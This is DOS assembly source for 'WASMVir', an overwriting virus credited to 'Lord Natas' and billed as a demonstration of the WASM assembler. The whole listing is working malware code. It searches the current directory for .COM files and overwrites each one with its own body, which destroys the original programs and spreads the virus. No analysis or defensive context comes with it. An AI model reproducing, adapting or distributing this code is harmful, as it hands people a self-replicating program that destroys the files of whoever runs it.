;WASMVir --> A lame overwriting virus to demonstrate WASM
;Overwrites all files in the current directory
;By Lord Natas

		org	100h

Start
		mov	ah,4eh
		mov	cx,7
		mov	dx,offset FileSpec
Virus

;----- find file

		int	21h
		jc	EndV

;----- open file

		mov	ax,3d01h
		mov	dx,9eh
		int	21h
		jc	Close

		xchg	bx,ax

;----- write file

		mov	ah,40h
		mov	cl,Length
		mov	dx,offset Start
		int	21h

Close

;----- close file

		mov	ah,3eh
		int	21h

		mov	ah,4fh
		jmps	Virus

EndV
		db	00C3h			;"RET"

;----- data

		db	'WASMVir'

FileSpec	db	'*.COM',0

TheEnd
Length	equ offset TheEnd - offset Start
